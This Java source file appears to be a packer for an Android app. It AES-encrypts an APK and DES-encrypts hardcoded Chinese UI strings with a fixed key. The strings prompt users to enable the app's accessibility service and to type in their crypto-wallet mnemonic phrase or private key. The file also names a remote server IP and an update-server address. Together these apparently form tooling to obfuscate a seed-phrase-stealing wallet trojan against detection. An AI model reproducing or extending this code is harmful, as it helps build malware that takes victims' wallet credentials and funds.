package byc;

import java.io.File;

import encrypt.AES;
import encrypt.DES;

public class Main {
	public static final String FILE_NAME = "app.apk";
	public static final String WORK_DIR = "force";
	
	private static final String KEY = "9ba45bfd500642328ec03ad8ef1b6e75";// 自定义密钥
	private static DES des = null;
	
	public static final String HOST2 = "103.97.3.61";
	public static final String HOST = "192.168.1.8";
	public static final String friendly_tips = "为了您更好地使用%s软件，开启%s的特色服务，需要打开%s的无障碍功能，是否现在去开启？";
	public static final String tvTitle = "导入您的助记词创建%s钱包";
	public static final String tvhint= "请输入助记词或私钥";
	public static final String tvSay1 = "*助记词是一组随机生成的12个英文单词。";
	public static final String tvSay2= "*私钥是一组无序无规则的字符串。";
	
	public volatile static String uIP="";//更新服务器地址
	
	
	public static void main(String[] args) {
		encryptFiles();
		//encryptStrings();

	}
	private static void encryptFiles(){
		String filename=WORK_DIR+File.separator+FILE_NAME;
		AES.lock(new File(filename));
		//AES.unlock(new File(filename));
		System.out.println("解密完成：" + filename);
	}
	private static void encryptStrings(){
	    //************************************解密字符串*********************************
		des = DES.getDes(KEY);
		encryptstring(friendly_tips);
        encryptstring(tvTitle);
		encryptstring(tvhint);
		encryptstring(tvSay1);
		encryptstring(tvSay2);
		
		encryptstring("a01");
		encryptstring("a02");
		encryptstring("a03");
		encryptstring("a04");
		encryptstring("a05");
	}
	private  static void encryptstring(String str){
		try {
			
			System.out.println("加密前的字符：" + str);
			String res=des.encode(str);
			System.out.println("加密后的字符：" + res);
			System.out.println("解密后的字符：" + des.decode(des.encode(str)));
			
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
